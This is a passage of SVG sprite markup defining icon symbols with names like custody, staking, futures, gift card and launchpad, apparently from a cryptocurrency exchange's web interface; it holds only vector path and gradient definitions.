      <symbol viewBox="0 0 24 24" id="convert-g">
        <g>
          <path fill-rule="evenodd" clip-rule="evenodd" d="M12 5a7 7 0 1 1 0 14 7 7 0 0 1 0-14zm0 10l-3-3 3-3 3 3-3 3z" fill="url(#paint0_linear)"></path>
          <path d="M15 3h6v6l-6-6z" fill="#76808F"></path>
          <path d="M9 21H3v-6l6 6z" fill="#76808F"></path>
          <defs>
            <linearGradient id="paint0_linear" x1="12" y1="19" x2="12" y2="5" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
          </defs>
        </g>
      </symbol>
      <symbol viewBox="0 0 96 96" id="custody-g">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M76 84H12V40H76V57L81 62L76 67V84ZM48 50V74H40V50H48Z" fill="url(#paint0_linear_7251_12)"></path>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M72 76C79.732 76 86 69.732 86 62C86 54.268 79.732 48 72 48C65.658 48 60.3009 52.217 58.5798 58L40 58V74H48L48 66L58.5798 66C60.3009 71.783 65.658 76 72 76ZM66 62L72 68L78 62L72 56L66 62Z" fill="#76808F"></path>
        <path d="M72 20L76 24L80 20L76 16L72 20Z" fill="#E6E8EA"></path>
        <path d="M85 79.5L87.5 82L90 79.5L87.5 77L85 79.5Z" fill="#E6E8EA"></path>
        <path d="M5 53H8V50H5V53Z" fill="#E6E8EA"></path>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M44 18C37.9249 18 33 22.9249 33 29V40H25V29C25 18.5066 33.5066 10 44 10C54.4934 10 63 18.5066 63 29V30H55V29C55 22.9249 50.0751 18 44 18Z" fill="#76808F"></path>
        <defs>
          <linearGradient id="paint0_linear_7251_12" x1="46.5" y1="84" x2="46.5" y2="40" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="customer-service-g">
        <path d="M6 10C6 6.68629 8.68629 4 12 4C15.3137 4 18 6.68629 18 10V17H20V10C20 5.58172 16.4183 2 12 2C7.58172 2 4 5.58172 4 10V17H6V10Z" fill="#76808F"></path>
        <path d="M12 18C13.3807 18 14.5 19.1193 14.5 20.5C14.5 21.8807 13.3807 23 12 23C10.6193 23 9.5 21.8807 9.5 20.5C9.5 19.1193 10.6193 18 12 18Z" fill="#76808F"></path>
        <path d="M0.5 13.5C0.5 15.433 2.067 17 4 17V10C2.067 10 0.5 11.567 0.5 13.5Z" fill="url(#paint0_linear_7_85)"></path>
        <path d="M23.5 13.5C23.5 15.433 21.933 17 20 17V10C21.933 10 23.5 11.567 23.5 13.5Z" fill="url(#paint1_linear_7_85)"></path>
        <defs>
          <linearGradient id="paint0_linear_7_85" x1="12" y1="17" x2="12" y2="10" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
          <linearGradient id="paint1_linear_7_85" x1="12" y1="17" x2="12" y2="10" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="earn-eth2">
        <circle cx="12" cy="12" r="10" fill="url(#paint0_linear_11883_82856)"></circle>
        <path d="M12 15.5365V19.0194L16.2867 13.0002L12 15.5365Z" fill="#76808F"></path>
        <g style="mix-blend-mode:soft-light" opacity="0.6">
          <path d="M12 15.5365V19.0194L16.2867 13.0002L12 15.5365Z" fill="url(#paint1_linear_11883_82856)"></path>
        </g>
        <path d="M12 10.1616V14.6448L16.2867 12.1085L12 10.1616Z" fill="#76808F"></path>
        <g style="mix-blend-mode:soft-light" opacity="0.6">
          <path d="M12 10.1616V14.6448L16.2867 12.1085L12 10.1616Z" fill="url(#paint2_linear_11883_82856)"></path>
        </g>
        <path d="M12 4.99969V10.1616L16.2867 12.1085L12 4.99969Z" fill="#76808F"></path>
        <path d="M11.9996 15.5365V19.0194L7.71289 13.0002L11.9996 15.5365Z" fill="#76808F"></path>
        <path d="M11.9996 10.1616V14.6448L7.71289 12.1085L11.9996 10.1616Z" fill="#76808F"></path>
        <g style="mix-blend-mode:soft-light" opacity="0.2">
          <path d="M11.9996 10.1616V14.6448L7.71289 12.1085L11.9996 10.1616Z" fill="url(#paint3_linear_11883_82856)"></path>
        </g>
        <path d="M11.9996 4.99969V10.1616L7.71289 12.1085L11.9996 4.99969Z" fill="#76808F"></path>
        <g style="mix-blend-mode:soft-light" opacity="0.5">
          <path d="M12.0004 4.99969V10.1616L16.2871 12.1085L12.0004 4.99969Z" fill="url(#paint4_linear_11883_82856)"></path>
        </g>
        <defs>
          <linearGradient id="paint0_linear_11883_82856" x1="12" y1="2" x2="12" y2="22" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F8D33A"></stop>
            <stop offset="1" stop-color="#F0B90B"></stop>
          </linearGradient>
          <linearGradient id="paint1_linear_11883_82856" x1="14.1434" y1="13.0002" x2="14.1434" y2="19.0194" gradientUnits="userSpaceOnUse">
            <stop></stop>
            <stop offset="1" stop-opacity="0"></stop>
          </linearGradient>
          <linearGradient id="paint2_linear_11883_82856" x1="14.1434" y1="10.1616" x2="14.1434" y2="14.6448" gradientUnits="userSpaceOnUse">
            <stop></stop>
            <stop offset="1" stop-opacity="0"></stop>
          </linearGradient>
          <linearGradient id="paint3_linear_11883_82856" x1="9.85625" y1="10.1616" x2="9.85625" y2="14.6448" gradientUnits="userSpaceOnUse">
            <stop></stop>
            <stop offset="1" stop-opacity="0"></stop>
          </linearGradient>
          <linearGradient id="paint4_linear_11883_82856" x1="14.1438" y1="4.99969" x2="14.1438" y2="12.1085" gradientUnits="userSpaceOnUse">
            <stop></stop>
            <stop offset="1" stop-opacity="0"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="earn-g">
        <g>
          <path fill-rule="evenodd" clip-rule="evenodd" d="M12 6a6 6 0 1 1 0 12 6 6 0 0 1 0-12zm0 8.5L9.5 12 12 9.5l2.5 2.5-2.5 2.5z" fill="url(#paint0_linear)"></path>
          <path fill-rule="evenodd" clip-rule="evenodd" d="M12 22c5.523 0 10-4.477 10-10S17.523 2 12 2c-.406 0-.807.024-1.2.071l.237 1.986m0 0a8 8 0 1 1-4.694 13.6L4.93 19.07A9.972 9.972 0 0 0 12 22" fill="#76808F"></path>
          <path d="M7.197 5.602a7.99 7.99 0 0 1 1.664-.963L8.075 2.8a9.99 9.99 0 0 0-2.08 1.204l1.202 1.599z" fill="#76808F"></path>
          <path d="M4.64 8.86a7.99 7.99 0 0 1 .962-1.663L4.003 5.995A9.99 9.99 0 0 0 2.8 8.075l1.84.786z" fill="#76808F"></path>
          <path d="M4 12c0-.326.02-.648.057-.963l-1.986-.238a10.094 10.094 0 0 0-.02 2.223l1.99-.202A8.107 8.107 0 0 1 4 12z" fill="#76808F"></path>
          <path d="M5.17 16.168a7.958 7.958 0 0 1-.706-1.476l-1.884.672c.232.65.53 1.268.884 1.847l1.706-1.043z" fill="#76808F"></path>
          <defs>
            <linearGradient id="paint0_linear" x1="12" y1="18" x2="12" y2="6" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
          </defs>
        </g>
      </symbol>
      <symbol viewBox="0 0 24 24" id="earn-lending-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M13.5572 6.26976L16.5 3H7.5L10.4428 6.26976C7.3263 6.97773 5 9.76516 5 13.0959V20.9709H19V13.0959C19 9.76516 16.6737 6.97773 13.5572 6.26976ZM12 17.0002C14.2091 17.0002 16 15.2094 16 13.0002C16 10.7911 14.2091 9.00023 12 9.00023C9.79086 9.00023 8 10.7911 8 13.0002C8 15.2094 9.79086 17.0002 12 17.0002ZM9.87868 12.9998L12 10.8785L14.1213 12.9998L12 15.1211L9.87868 12.9998Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="earn-savings-g">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M22 6C22 3.79086 20.2091 2 18 2C15.7909 2 14 3.79086 14 6C14 8.20914 15.7909 10 18 10C20.2091 10 22 8.20914 22 6ZM16.3335 6.00008L18.0002 7.66675L19.6668 6.00008L18.0002 4.33341L16.3335 6.00008Z" fill="url(#paint0_linear_7105_37452)"></path>
        <path d="M3.5438 16H2V22H22V16H14.4557C13.9077 17.1939 12.9794 18.177 11.8259 18.7941H6.17363C5.02009 18.177 4.09176 17.1939 3.5438 16Z" fill="#76808F"></path>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M8.99976 7.5C12.3135 7.5 14.9998 10.1863 14.9998 13.5C14.9998 15.7919 13.7147 17.7836 11.8259 18.7941H6.17363C4.28477 17.7836 2.99976 15.7919 2.99976 13.5C2.99976 10.1863 5.68605 7.5 8.99976 7.5ZM8.99976 16L6.49976 13.5L8.99976 11L11.4998 13.5L8.99976 16Z" fill="url(#paint1_linear_7105_37452)"></path>
        <defs>
          <linearGradient id="paint0_linear_7105_37452" x1="18" y1="2" x2="18" y2="10" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
          <linearGradient id="paint1_linear_7105_37452" x1="8.99976" y1="7.5" x2="8.99976" y2="18.7941" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="earn-staking-g">
        <path d="M18 6C18 4.34315 16.6569 3 15 3C13.3431 3 12 4.34315 12 6C12 7.65685 13.3431 9 15 9C16.6569 9 18 7.65685 18 6Z" fill="url(#paint0_linear_7105_37458)"></path>
        <path d="M9 13C9 12.4477 8.55228 12 8 12C7.44772 12 7 12.4477 7 13C7 13.5523 7.44772 14 8 14C8.55228 14 9 13.5523 9 13Z" fill="url(#paint1_linear_7105_37458)"></path>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M21 15.5C21 18.5376 18.5376 21 15.5 21C12.4624 21 10 18.5376 10 15.5C10 12.4624 12.4624 10 15.5 10C18.5376 10 21 12.4624 21 15.5ZM13 15.5L15.5 18L18 15.5L15.5 13L13 15.5Z" fill="url(#paint2_linear_7105_37458)"></path>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M11 7C11 9.20914 9.20914 11 7 11C4.79086 11 3 9.20914 3 7C3 4.79086 4.79086 3 7 3C9.20914 3 11 4.79086 11 7ZM5.5 7L7 5.5L8.5 7L7 8.5L5.5 7Z" fill="#76808F"></path>
        <path d="M21 9C21 9.55228 20.5523 10 20 10C19.4477 10 19 9.55228 19 9C19 8.44772 19.4477 8 20 8C20.5523 8 21 8.44772 21 9Z" fill="#76808F"></path>
        <path d="M9 18C9 19.6569 7.65685 21 6 21C4.34315 21 3 19.6569 3 18C3 16.3431 4.34315 15 6 15C7.65685 15 9 16.3431 9 18Z" fill="#76808F"></path>
        <defs>
          <linearGradient id="paint0_linear_7105_37458" x1="14" y1="21" x2="14" y2="3" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
          <linearGradient id="paint1_linear_7105_37458" x1="14" y1="21" x2="14" y2="3" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
          <linearGradient id="paint2_linear_7105_37458" x1="14" y1="21" x2="14" y2="3" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="eco-trust-s24">
        <g>
          <path d="M19.583 14.562l-7 5.604-3.966-3.088-3.034-2.516L5 4.61h3.617l3.966-1.944L16.55 4.61h3.617l-.584 9.95z" fill="url(#paint0_linear)"></path>
          <defs>
            <linearGradient id="paint0_linear" x1="12.583" y1="2.667" x2="12.583" y2="20.166" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F8D12F"></stop>
              <stop offset="1" stop-color="#F0B90B"></stop>
            </linearGradient>
          </defs>
        </g>
      </symbol>
      <symbol viewBox="0 0 24 24" id="edit-g">
        <path d="M3 21H21V6L18 3H3V21Z" fill="url(#paint0_linear_7_44)"></path>
        <path d="M6 18V13.5L15.0855 4.4145L19.5855 8.9145L10.5 18H6Z" fill="#76808F"></path>
        <path d="M20.9997 7.50029L23 5.5L18.5 1L16.4997 3.00029L20.9997 7.50029Z" fill="#76808F"></path>
        <defs>
          <linearGradient id="paint0_linear_7_44" x1="12" y1="21" x2="12" y2="3" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="educate-g">
        <path d="M8 4H2V20H12V8C12 5.79086 10.2091 4 8 4Z" fill="url(#paint0_linear_9944_23638)"></path>
        <path d="M8 16H2V20H12C12 17.7909 10.2091 16 8 16Z" fill="#76808F"></path>
        <path d="M16 4H22V20H12V8C12 5.79086 13.7909 4 16 4Z" fill="url(#paint1_linear_9944_23638)"></path>
        <path d="M16 16H22V20H12C12 17.7909 13.7909 16 16 16Z" fill="#76808F"></path>
        <defs>
          <linearGradient id="paint0_linear_9944_23638" x1="7" y1="20" x2="7" y2="4" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
          <linearGradient id="paint1_linear_9944_23638" x1="17" y1="20" x2="17" y2="4" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 96 96" id="execution-otc-g">
        <path opacity="0.3" d="M0 3.5L3.5 7L7 3.5L3.5 0L0 3.5Z" fill="#AEB4BC"></path>
        <path opacity="0.3" d="M83.9995 33.7532L88.4995 38.2532L92.9995 33.7532L88.4995 29.2532L83.9995 33.7532Z" fill="#AEB4BC"></path>
        <path opacity="0.3" d="M3 66.751H12V57.751H3V66.751Z" fill="#AEB4BC"></path>
        <circle r="10.5" transform="matrix(1 -2.18557e-08 -2.18557e-08 -1 35.0039 35.0037)" fill="#F8D33A"></circle>
        <circle r="7.1842" transform="matrix(1 -2.18557e-08 -2.18557e-08 -1 35.004 35.0048)" fill="url(#paint0_linear_47958_27009)"></circle>
        <path d="M31.1353 35.0037L35.0037 38.8721L38.8721 35.0037L35.0037 31.1352L31.1353 35.0037Z" fill="#F0B90B"></path>
        <circle r="10.5" transform="matrix(1 -2.18557e-08 -2.18557e-08 -1 60.9966 60.9964)" fill="#F8D33A"></circle>
        <circle r="7.1842" transform="matrix(1 -2.18557e-08 -2.18557e-08 -1 60.9967 60.9974)" fill="url(#paint1_linear_47958_27009)"></circle>
        <path d="M57.1279 60.9963L60.9963 64.8647L64.8648 60.9963L60.9963 57.1279L57.1279 60.9963Z" fill="#F0B90B"></path>
        <path d="M83.9995 19.002L64.9976 0V12.0025H12.0029V47.501H19.0029V19.0025L83.9995 19.002Z" fill="url(#paint2_linear_47958_27009)"></path>
        <path d="M31.002 83.9976H83.9966V48.499H76.9966V76.9976L12 76.9981L31.002 96.0001V83.9976Z" fill="url(#paint3_linear_47958_27009)"></path>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M25.5156 65.5348L65.5353 25.5151L70.4851 30.4649L30.4654 70.4846L25.5156 65.5348Z" fill="url(#paint4_linear_47958_27009)"></path>
        <defs>
          <linearGradient id="paint0_linear_47958_27009" x1="7.1842" y1="0" x2="7.1842" y2="14.3684" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
          <linearGradient id="paint1_linear_47958_27009" x1="7.1842" y1="0" x2="7.1842" y2="14.3684" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
          <linearGradient id="paint2_linear_47958_27009" x1="48.0012" y1="0" x2="48.0012" y2="47.501" gradientUnits="userSpaceOnUse">
            <stop stop-color="#929AA5"></stop>
            <stop offset="1" stop-color="#76808F"></stop>
          </linearGradient>
          <linearGradient id="paint3_linear_47958_27009" x1="47.9983" y1="48.499" x2="47.9983" y2="96.0001" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
          <linearGradient id="paint4_linear_47958_27009" x1="48.0003" y1="25.5151" x2="48.0003" y2="70.4846" gradientUnits="userSpaceOnUse">
            <stop stop-color="#929AA5"></stop>
            <stop offset="1" stop-color="#76808F"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="fan-token">
        <path d="M2 16H8V20H2V16Z" fill="#76808F"></path>
        <path d="M16 13H22V20H16V13Z" fill="#76808F"></path>
        <path d="M8 20H16V10H8V20Z" fill="url(#paint0_linear)"></path>
        <path d="M9 5L12 2L15 5L12 8L9 5Z" fill="#76808F"></path>
        <defs>
          <linearGradient id="paint0_linear" x1="12" y1="20" x2="12" y2="10" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 25" id="faq-g">
        <path d="M20 2.5V18.5H14L9 23.5V18.5H4V2.5H20Z" fill="url(#paint0_linear_2_187)"></path>
        <path d="M13 14.5V16.5H11V14.5H13Z" fill="#76808F"></path>
        <path d="M10.5 8C10.5 7.17157 11.1716 6.5 12 6.5C12.8284 6.5 13.5 7.17157 13.5 8C13.5 8.41449 13.3332 8.78812 13.0607 9.06066L11 11.1213V13H13V11.9497L14.4749 10.4749C15.1072 9.84259 15.5 8.96622 15.5 8C15.5 6.067 13.933 4.5 12 4.5C10.067 4.5 8.5 6.067 8.5 8V8.5H10.5V8Z" fill="#76808F"></path>
        <defs>
          <linearGradient id="paint0_linear_2_187" x1="12" y1="23.5" x2="12" y2="2.5" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="futures-coin-m-g">
        <g>
          <path d="M6 2h15v17a2 2 0 0 1-2 2H4l2-2V2z" fill="url(#paint0_linear)"></path>
          <path fill-rule="evenodd" clip-rule="evenodd" d="M13.5 14a4.5 4.5 0 1 0 0-9 4.5 4.5 0 0 0 0 9zm0-2.864L11.864 9.5 13.5 7.864 15.136 9.5 13.5 11.136z" fill="#76808F"></path>
          <path d="M9 16h9v2H9v-2z" fill="#76808F"></path>
          <path d="M4 21a2 2 0 0 0 2-2v-7H2v7a2 2 0 0 0 2 2z" fill="#76808F"></path>
          <defs>
            <linearGradient id="paint0_linear" x1="12.5" y1="21" x2="12.5" y2="2" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
          </defs>
        </g>
      </symbol>
      <symbol viewBox="0 0 24 24" id="futures-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M8.5 3H20V16C20 18.2091 18.2091 20 16 20H7.5C5.567 20 4 18.433 4 16.5V9H8.5V3ZM11 14.5056V17.0056L17.5 17.0056V14.5056H11ZM8.5 11.5H6.5V16.5C6.5 17.0523 6.94772 17.5 7.5 17.5C8.05228 17.5 8.5 17.0523 8.5 16.5V11.5ZM12.5001 6.00562H17.5001V11.0056L15.8846 9.3901L13.2691 12.0056L11.5013 10.2379L14.1168 7.62233L12.5001 6.00562Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="futures-g">
        <g>
          <path d="M6 2h15v17a2 2 0 0 1-2 2H4l2-2V2z" fill="url(#paint0_linear)"></path>
          <path d="M4 21a2 2 0 0 0 2-2v-7H2v7a2 2 0 0 0 2 2z" fill="#76808F"></path>
          <path d="M9 16h9v2H9v-2z" fill="#76808F"></path>
          <path d="M18 5v7.5l-3.043-3.043L10.414 14 9 12.586l4.543-4.543L10.5 5H18z" fill="#76808F"></path>
          <defs>
            <linearGradient id="paint0_linear" x1="12.5" y1="21" x2="12.5" y2="2" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
          </defs>
        </g>
      </symbol>
      <symbol viewBox="0 0 24 24" id="futures-leveraged-token-g">
        <g>
          <path fill-rule="evenodd" clip-rule="evenodd" d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12s4.477 10 10 10 10-4.477 10-10zm-10 7l6-6H6l6 6z" fill="url(#paint0_linear)"></path>
          <path d="M18 11l-6-6-6 6h12z" fill="#76808F"></path>
          <path d="M18 13l-6 6-6-6h12z" fill="#76808F"></path>
          <defs>
            <linearGradient id="paint0_linear" x1="12" y1="22" x2="12" y2="2" gradientUnits="userSpaceOnUse">
              <stop offset=".333" stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#FBDA3C"></stop>
            </linearGradient>
          </defs>
        </g>
      </symbol>
      <symbol viewBox="0 0 24 24" id="futures-options-european-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M20 3H8.5V9H4V16.5C4 18.433 5.567 20 7.5 20H16C18.2091 20 20 18.2091 20 16V3ZM6.5 11.5H8.5V16.5C8.5 17.0523 8.05228 17.5 7.5 17.5C6.94772 17.5 6.5 17.0523 6.5 16.5V11.5ZM16.8637 15.25H11.6611V7.75H16.8637V9.44977H13.536V10.6141H16.3898V12.3035H13.536V13.5502H16.8637V15.25Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="futures-options-european-g">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M21 2H6V19C6 20.1046 5.10457 21 4 21H19C20.1046 21 21 20.1046 21 19V2ZM11.5 10.5L11.5 7L14 7L10.5 3.5L7 7L9.5 7L9.5 10.5H11.5ZM11.5 12.5H9.5V16H7L10.5 19.5L14 16H11.5L11.5 12.5ZM14.3159 15H19.1717V13.4135H16.0658V12.25H18.7293V10.6731H16.0658V9.58645H19.1717V8H14.3159V15Z" fill="url(#paint0_linear_1107_26006)"></path>
        <path d="M11.5 7L11.5 10.5H9.5L9.5 7L7 7L10.5 3.5L14 7L11.5 7Z" fill="#76808F"></path>
        <path d="M9.5 12.5H11.5L11.5 16H14L10.5 19.5L7 16H9.5V12.5Z" fill="#76808F"></path>
        <path d="M14.3159 15H19.1717V13.4135H16.0658V12.25H18.7293V10.6731H16.0658V9.58645H19.1717V8H14.3159V15Z" fill="#76808F"></path>
        <path d="M6 19C6 20.1046 5.10457 21 4 21C2.89543 21 2 20.1046 2 19V12H6V19Z" fill="#76808F"></path>
        <defs>
          <linearGradient id="paint0_linear_1107_26006" x1="12.5" y1="2" x2="12.5" y2="21" gradientUnits="userSpaceOnUse">
            <stop offset="0.333333" stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#FBDA3C"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="futures-options-vanilla-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M20 3H8.5V9H4V16.5C4 18.433 5.567 20 7.5 20H16C18.2091 20 20 18.2091 20 16V3ZM6.5 11.5H8.5V16.5C8.5 17.0523 8.05228 17.5 7.5 17.5C6.94772 17.5 6.5 17.0523 6.5 16.5V11.5ZM17.7194 8.5L15.5479 15.5H14.003H12.4328L10.2805 8.5H12.4964L14.003 14.0559L15.5479 8.5H17.7194Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="futures-options-vanilla-g">
        <g>
          <path d="M6 2h15v17a2 2 0 0 1-2 2H4l2-2V2z" fill="url(#paint0_linear)"></path>
          <path d="M4 21a2 2 0 0 0 2-2v-7H2v7a2 2 0 0 0 2 2z" fill="#76808F"></path>
          <path d="M9.5 10.5h2V7H14l-3.5-3.5L7 7h2.5v3.5z" fill="#76808F"></path>
          <path d="M11.5 12.5h-2V16H7l3.5 3.5L14 16h-2.5v-3.5z" fill="#76808F"></path>
          <path d="M15.846 16h1.298L19.5 9h-1.817l-1.178 3.913L15.307 9H13.5l2.346 7z" fill="#76808F"></path>
          <defs>
            <linearGradient id="paint0_linear" x1="12.5" y1="21" x2="12.5" y2="2" gradientUnits="userSpaceOnUse">
              <stop offset=".333" stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#FBDA3C"></stop>
            </linearGradient>
          </defs>
        </g>
      </symbol>
      <symbol viewBox="0 0 24 24" id="futures-usdt-m-g">
        <g>
          <path d="M6 2h15v17a2 2 0 0 1-2 2H4l2-2V2z" fill="url(#paint0_linear)"></path>
          <path d="M14.5 18v-1.448c2.006-.332 2.941-1.583 2.941-3.061 0-1.539-1.01-2.398-3.122-2.88V8.106c.724.166 1.207.497 1.569.905l1.372-1.237c-.664-.754-1.553-1.222-2.76-1.357V5h-1.72v1.418c-1.945.226-2.985 1.282-2.985 2.865 0 1.463.92 2.458 3.182 2.926v2.714c-.845-.12-1.553-.527-2.127-1.13l-1.357 1.236c.754.83 1.765 1.448 3.288 1.584V18h1.72zm-2.624-8.777c0-.588.332-.996 1.1-1.146v2.232c-.768-.212-1.1-.513-1.1-1.086zm3.484 4.434c0 .573-.332 1.04-1.04 1.236V12.51c.859.257 1.04.71 1.04 1.147z" fill="#76808F"></path>
          <path d="M4 21a2 2 0 0 0 2-2v-7H2v7a2 2 0 0 0 2 2z" fill="#76808F"></path>
          <defs>
            <linearGradient id="paint0_linear" x1="12.5" y1="21" x2="12.5" y2="2" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
          </defs>
        </g>
      </symbol>
      <symbol viewBox="0 0 40 40" id="gift-card">
        <path d="M33 30H7V10H33V30Z" fill="url(#paint0_linear)"></path>
        <path d="M14.8 10H17.4V16.9825L20.7615 13.7504L22.6 15.5182L19.2388 18.75H33V21.25H19.2381L22.5997 24.4823L20.7611 26.25L17.4 23.0182V30H14.8V23.0183L11.4394 26.25L9.60101 24.4823L12.9621 21.25H7V18.75H12.9613L9.59996 15.5177L11.4385 13.7499L14.8 16.9825V10Z" fill="#76808F"></path>
        <defs>
          <linearGradient id="paint0_linear" x1="20" y1="30" x2="20" y2="10" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="historical-market-date-g">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M4 18H22V4H20L13 11H8L4 15V18Z" fill="url(#paint0_linear_1535_81)"></path>
        <path d="M4 4H2V20L22 20V18L4 18V4Z" fill="#76808F"></path>
        <defs>
          <linearGradient id="paint0_linear_1535_81" x1="13" y1="18" x2="13" y2="4" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="institutional-home-g">
        <path d="M21 11L20.9999 21H15V13H9V21H3V11L12 2L21 11Z" fill="url(#paint0_linear_1330_2488)"></path>
        <rect width="6" height="8" transform="matrix(1 0 0 -1 9 21)" fill="#76808F"></rect>
        <defs>
          <linearGradient id="paint0_linear_1330_2488" x1="12" y1="21" x2="12" y2="2" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="labs-g">
        <g>
          <path d="M10 17.171a6.002 6.002 0 0 1 4-5.658V7h4v4.513c2.33.823 4 3.046 4 5.658H10z" fill="url(#paint0_linear)"></path>
          <path d="M11.586 5.828L8.757 3l-6 6h5.657l3.172-3.172z" fill="url(#paint1_linear)"></path>
          <path d="M14.272 1l-2 2 2 2 2-2-2-2z" fill="#76808F"></path>
          <path d="M22 5h-2v2h2V5z" fill="#76808F"></path>
          <path d="M8.414 9l-4 4a2 2 0 0 1-2.828-2.828L2.757 9h5.657z" fill="#76808F"></path>
          <path d="M16 23.171a6 6 0 0 0 6-6H10a6 6 0 0 0 6 6z" fill="#76808F"></path>
          <path d="M10.272 10l1-1 1 1-1 1-1-1z" fill="#76808F"></path>
          <defs>
            <linearGradient id="paint0_linear" x1="16" y1="17.171" x2="16" y2="7" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
            <linearGradient id="paint1_linear" x1="7.172" y1="9" x2="7.172" y2="3" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
          </defs>
        </g>
      </symbol>
      <symbol viewBox="0 0 24 24" id="launchpad-f">
